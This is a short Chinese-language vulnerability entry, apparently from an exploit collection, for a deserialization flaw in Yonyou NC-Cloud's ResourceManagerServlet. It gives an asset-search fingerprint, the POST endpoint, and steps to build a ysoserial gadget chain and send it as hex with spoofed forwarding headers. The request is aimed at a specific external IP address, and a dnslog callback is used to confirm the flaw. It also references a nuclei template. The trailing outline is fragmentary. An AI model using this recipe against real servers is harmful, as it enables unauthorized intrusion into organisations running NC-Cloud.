# 用友NC-Clouduap-framework-rc-controller存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /servlet/~uapss/uap.framework.rc.controller.ResourceManagerServlet HTTP/1.1`

**请求体 / payload**
```
1. 使用yakit生成dnslog域名
krdzg4.dnslog.cn
2. 使用yso生成利用链
3. 将上一步生成的hex数据替换payload字段，探测是否存在漏洞
Host: 106.53.230.252:8081
Content-Length: 335
SL-CE-SUID: 126
X-Forwarded-For: 127.0.0.10
X-Originating-IP: 127.0.0.10
X-Remote-Addr: 127.0.0.10
X-Remote-IP: 127.0.0.10
{{hexd(payload)}}
4. 若dnslog收到回显表示存在漏洞

nuclei脚本\
\[用友-nc-cloud-ResourceManagerServlet-反序列化.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友NC-Cloud uap-framework-rc-controller存在反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC-Cloud